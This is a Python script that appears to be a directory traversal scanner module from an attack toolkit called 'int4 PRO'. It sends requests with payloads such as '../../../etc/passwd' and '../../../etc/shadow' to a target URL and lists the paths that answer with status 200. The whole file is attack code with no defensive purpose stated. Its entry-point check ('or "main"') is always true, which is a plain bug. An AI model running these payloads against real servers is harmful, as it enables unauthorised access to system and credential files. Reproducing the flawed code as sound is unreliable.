import requests
from colorama import Fore, Style

def directory_traversal(url, paths):
    found_directories = []
    for path in paths:
        try:
            response = requests.get(f"{url}/{path}")
            if response.status_code == 200:
                found_directories.append(f"{url}/{path}")
        except requests.exceptions.RequestException:
            pass
    return found_directories

def directory_traversal_module():
    paths = ['../../../etc/passwd', '../../../etc/shadow', '../index.php', '../admin.php']
    print(f"{Fore.GREEN}Directory Traversal Scanner Module Started!{Style.RESET_ALL}")
    
    while True:
        module = input(f"{Fore.RED + Style.BRIGHT}int4{Style.RESET_ALL} PRO({Fore.RED + Style.BRIGHT}DirectoryTraversalScanner{Style.RESET_ALL}) > ")
        
        if module.lower() == "exit":
            print(f"{Fore.YELLOW}Exiting the module...{Style.RESET_ALL}")
            break
        
        elif module.startswith("scanpaths "):
            try:
                _, target_url = module.split(" ")
                directories = directory_traversal(target_url, paths)
                if directories:
                    print(f"{Fore.YELLOW}Found directories for {target_url}: {', '.join(directories)}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.GREEN}No directories found for {target_url}{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}Invalid input! Correct usage: scanpaths <URL>{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Invalid command: {module}{Style.RESET_ALL}")
if __name__ == "__main__" or "main":
	directory_traversal_module()